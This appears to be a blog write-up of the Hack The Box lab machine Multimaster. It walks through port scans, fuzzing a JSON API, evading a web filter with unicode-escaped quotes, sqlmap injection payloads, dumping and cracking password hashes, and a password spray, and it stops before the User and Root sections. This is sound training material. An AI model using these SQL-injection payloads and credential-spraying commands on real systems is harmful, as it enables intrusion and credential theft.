---
title: "[HTB] Machine: Multimaster"
description: "[HTB] Machine: Multimaster"
date: 2023-10-04
menu:
  sidebar:
    name: "[HTB] Machine: Multimaster"
    identifier: htb-machine-Multimaster
    parent: htb-machines-windows
    weight: 10
hero: images/multimaster.png
tags: ["HTB"]
---

# Multimaster
## Enumeration
- `nmap`
```
└─$ nmap -Pn -p- 10.10.10.179 --min-rate 10000
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-08 19:46 BST
Nmap scan report for 10.10.10.179 (10.10.10.179)
Host is up (0.13s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
49666/tcp open  unknown
49667/tcp open  unknown
49674/tcp open  unknown
49675/tcp open  unknown
49678/tcp open  unknown
49698/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 45.14 seconds
```
```
└─$ nmap -Pn -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sC -sV 10.10.10.179 --min-rate 10000
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-08 19:46 BST
Nmap scan report for 10.10.10.179 (10.10.10.179)
Host is up (0.56s latency).

PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
80/tcp   open  http         Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: 403 - Forbidden: Access is denied.
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2023-10-08 18:52:31Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)
445/tcp  open               Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGACORP)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf       .NET Message Framing
Service Info: Host: MULTIMASTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h26m16s, deviation: 4h02m30s, median: 6m16s
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-time: 
|   date: 2023-10-08T18:52:41
|_  start_date: 2023-10-08T18:50:58
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: MULTIMASTER
|   NetBIOS computer name: MULTIMASTER\x00
|   Domain name: MEGACORP.LOCAL
|   Forest name: MEGACORP.LOCAL
|   FQDN: MULTIMASTER.MEGACORP.LOCAL
|_  System time: 2023-10-08T11:52:40-07:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 59.26 seconds
```

- `smb`
```
└─$ smbclient -N -L //10.10.10.179                            
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.179 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

- Web Server

![](./images/1.png)

- `gobuster`
  - `WAF` is probably blocking requests
```
└─$ gobuster dir -u http://10.10.10.179 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -t 50  -x asp,aspx,txt   
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.179
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              asp,aspx,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 150] [--> http://10.10.10.179/images/]
/contact.asp          (Status: 403) [Size: 1233]
/full.asp             (Status: 403) [Size: 1233]
/full.txt             (Status: 403) [Size: 1233]
/full                 (Status: 403) [Size: 1233]
/12.asp               (Status: 403) [Size: 1233]
/2006                 (Status: 403) [Size: 1233]
/12.aspx              (Status: 403) [Size: 1233]
/full.aspx            (Status: 403) [Size: 1233]
...
```

## Foothold
- We have bunch of potential usernames

![](./images/2.png)

- Let's open `Burp` and test for `sqli`
  - If send special char, I receive `403`
  - I also tested for `nosqli`, but received `500`

![](./images/3.png)

- Let's fuzz for special chars
```
└─$ wfuzz -c -u http://10.10.10.179/api/getColleagues -w /usr/share/seclists/Fuzzing/special-chars.txt -d '{"name":"FUZZ"}' -H 'Content-Type: application/json;charset=utf-8'     
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.179/api/getColleagues
Total requests: 32

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                    
=====================================================================

000000001:   200        0 L      1 W        2 Ch        "~"
000000029:   403        29 L     92 W       1233 Ch     "'"
000000028:   403        29 L     92 W       1233 Ch     ":"
000000032:   403        29 L     92 W       1233 Ch     ">"
000000030:   403        29 L     92 W       1233 Ch     """
000000003:   200        0 L      1 W        2 Ch        "@"
000000015:   200        0 L      1 W        2 Ch        "="
000000007:   200        0 L      1 W        2 Ch        "^"
000000031:   200        0 L      1 W        2 Ch        "<"
000000014:   200        0 L      1 W        2 Ch        "+"
000000027:   200        0 L      1 W        2 Ch        ";"
000000026:   200        0 L      1 W        2 Ch        "?"
000000025:   200        0 L      1 W        2 Ch        "/"
000000024:   200        0 L      1 W        2 Ch        "."
000000023:   200        0 L      1 W        2 Ch        ","
000000022:   200        0 L      1 W        2 Ch        "`"
000000021:   500        0 L      4 W        36 Ch       "\"
000000018:   200        0 L      1 W        2 Ch        "]"
000000006:   403        29 L     92 W       1233 Ch     "%"
000000019:   200        0 L      1 W        2 Ch        "["
000000017:   200        0 L      1 W        2 Ch        "}"
000000016:   200        0 L      1 W        2 Ch        "{"
000000013:   200        0 L      33 W       1821 Ch     "_"
000000011:   200        0 L      1 W        2 Ch        ")"
000000010:   200        0 L      1 W        2 Ch        "("
000000009:   200        0 L      1 W        2 Ch        "*"
000000020:   200        0 L      1 W        2 Ch        "|"
000000012:   200        0 L      1 W        2 Ch        "-"
000000004:   403        29 L     92 W       1233 Ch     "#"
000000008:   403        29 L     92 W       1233 Ch     "&"
000000002:   200        0 L      1 W        2 Ch        "!"
000000005:   403        29 L     92 W       1233 Ch     "$"

Total time: 0
Processed Requests: 32
Filtered Requests: 0
Requests/sec.: 0
```

- If we set `-t` to `1`, we receive other results
```
└─$ wfuzz -c -u http://10.10.10.179/api/getColleagues -w /usr/share/seclists/Fuzzing/special-chars.txt -d '{"name":"FUZZ"}' -H 'Content-Type: application/json;charset=utf-8' -t 1 --hc 200
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.179/api/getColleagues
Total requests: 32

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                    
=====================================================================

000000004:   403        29 L     92 W       1233 Ch     "#"
000000021:   500        0 L      4 W        36 Ch       "\"
000000030:   500        0 L      4 W        36 Ch       """
000000029:   403        29 L     92 W       1233 Ch     "'"
000000031:   403        29 L     92 W       1233 Ch     "<"
000000032:   403        29 L     92 W       1233 Ch     ">"

Total time: 0
Processed Requests: 32
Filtered Requests: 26
Requests/sec.: 0
```

- If we take a closer look and `Content-Type` we see `application/json;charset=utf-8`
  - I have never seen it before
  - It means that `the content to be in JSON format, encoded in the UTF-8 character encoding.`
    - https://stackoverflow.com/questions/9254891/what-does-content-type-application-json-charset-utf-8-really-mean
  - So if we send `\u27`, which is ASCII value of `'`, we receive `500``
  - Possibly indicating that there's an `sqli` 

![](./images/4.png)

- Let's use `sqlmap`
  - I assume the `dbms` is `mssql`
  - Let's start with a lighter query
  - In case I don't have anything, I'll run `sqlmap` with different parameters

```
└─$ sqlmap -r sqli.req --tamper=charunicodeescape --delay 5 --level 5 --risk 3 --batch --dbms=mssql
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.7.9#stable}
|_ -| . [)]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:34:33 /2023-10-13/

[14:34:33] [INFO] parsing HTTP request from 'sqli.req'
[14:34:33] [INFO] loading tamper module 'charunicodeescape'
JSON data found in POST body. Do you want to process it? [Y/n/q] Y
[14:34:33] [INFO] testing connection to the target URL
...
(custom) POST parameter 'JSON name' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 466 HTTP(s) requests:
---
Parameter: JSON name ((custom) POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: {"name":"\u27' OR NOT 5590=5590-- bkOY"}

    Type: stacked queries
    Title: Microsoft SQL Server/Sybase stacked queries (comment)
    Payload: {"name":"\u27';WAITFOR DELAY '0:0:5'--"}

    Type: time-based blind
    Title: Microsoft SQL Server/Sybase time-based blind (IF)
    Payload: {"name":"\u27' WAITFOR DELAY '0:0:5'-- Wvdt"}
---
[15:57:00] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
[15:57:00] [INFO] testing Microsoft SQL Server
[15:57:05] [INFO] confirming Microsoft SQL Server
[15:57:27] [INFO] the back-end DBMS is Microsoft SQL Server
web server operating system: Windows 10 or 2022 or 2016 or 11 or 2019
web application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 10.0
back-end DBMS: Microsoft SQL Server 2017
[15:57:27] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 2 times
[15:57:27] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.10.179'

[*] ending @ 15:57:27 /2023-10-13/

```

- Let's dump the databases
```
└─$ sqlmap -r sqli.req --tamper=charunicodeescape --delay 5 --level 5 --risk 3 --batch --dbms=mssql --dbs
...
[17:13:49] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
available databases [4]:
[*] Hub_DB
[*] [master]
[*] model
[*] msdb
[*] tempdb
```
```
└─$ sqlmap -r sqli.req --tamper=charunicodeescape --delay 5 --level 5 --risk 3 --batch --dbms=mssql --exclude-sysdbs --dump-all
...
Database: Hub_DB                                           
Table: Colleagues                                          
[17 entries]                                               
+------+----------------------+-------------+----------------------+----------------------+
| id   | email                | image       | name                 | position             |
+------+----------------------+-------------+----------------------+----------------------+
| 1    | sbauer@megacorp.htb  | sbauer.jpg  | Sarina Bauer         | Junior Developer     |
| 2    | okent@megacorp.htb   | okent.jpg   | Octavia Kent         | Senior Consultant    |
| 3    | ckane@megacorp.htb   | ckane.jpg   | Christian Kane       | Assistant Manager    |
| 4    | kpage@megacorp.htb   | kpage.jpg   | Kimberly Page        | Financial Analyst    |
| 5    | shayna@megacorp.htb  | shayna.jpg  | Shayna Stafford      | HR Manager           |
| 6    | james@megacorp.htb   | james.jpg   | James Houston        | QA Lead              |
| 7    | cyork@megacorp.htb   | cyork.jpg   | Connor York          | Web Developer        |
| 8    | rmartin@megacorp.htb | rmartin.jpg | Reya Martin          | Tech Support         |
| 9    | zac@magacorp.htb     | zac.jpg     | Zac Curtis           | Junior Analyst       |
| 10   | jorden@megacorp.htb  | jorden.jpg  | Jorden Mclean        | Full-Stack Developer |
| 11   | alyx@megacorp.htb    | alyx.jpg    | Alyx Walters         | Automation Engineer  |
| 12   | ilee@megacorp.htb    | ilee.jpg    | Ian Lee              | Internal Auditor     |
| 13   | nbourne@megacorp.htb | nbourne.jpg | Nikola Bourne        | Head of Accounts     |
| 14   | zpowers@megacorp.htb | zpowers.jpg | Zachery Powers       | Credit Analyst       |
| 15   | aldom@megacorp.htb   | aldom.jpg   | Alessandro Dominguez | Senior Web Developer |
| 16   | minato@megacorp.htb  | minato.jpg  | MinatoTW             | CEO                  |
| 17   | egre55@megacorp.htb  | egre55.jpg  | egre55               | CEO                  |
+------+----------------------+-------------+----------------------+----------------------+
...
Database: Hub_DB 
Table: Logins                                              
[17 entries]
+------+----------+--------------------------------------------------------------------------------------------------+
| id   | username | password                                                                                         |
+------+----------+--------------------------------------------------------------------------------------------------+
| 1    | sbauer   | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 |
| 2    | okent    | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa |
| 3    | ckane    | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 |
| 4    | kpage    | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 |
| 5    | shayna   | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 |
| 6    | james    | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 |
| 7    | cyork    | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 |
| 8    | rmartin  | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa |
| 9    | zac      | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 |
| 10   | jorden   | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 |
| 11   | alyx     | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa |
| 12   | ilee     | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 |
| 13   | nbourne  | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa |
| 14   | zpowers  | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 |
| 15   | aldom    | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 |
| 16   | minatotw | cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc |
| 17   | egre55   | cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc |
+------+----------+--------------------------------------------------------------------------------------------------+
...
```

- Let's crack the hashes
```
└─$ hashcat -m 17900 hash /usr/share/wordlists/rockyou.txt --force 
hashcat (v6.2.6) starting

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.
...

9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739:password1
68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813:finance1
fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa:banking1
...
```

- Looks like we have following creds
```
password1 - sbauer, shayna, james, cyork, jorden, aldom
finance1 - ckane, kpage, zac, ilee, zpowers
banking1 - okent, rmartin, alyx, nbourne
```

- Testing for validity of the accounts shows nothing
```
└─$ crackmapexec smb 10.10.10.179 -u users.list -p passwords.list 
SMB         10.10.10.179    445    MULTIMASTER      [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP.LOCAL) (signing:True) (SMBv1:True)
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\sbauer:password1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\sbauer:finance1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\sbauer:banking1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\okent:password1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\okent:finance1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\okent:banking1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\ckane:password1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\ckane:finance1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\ckane:banking1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\kpage:password1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\kpage:finance1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\kpage:banking1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\shayna:password1 STATUS_LOGON_FAILURE
...
```


## User


## Root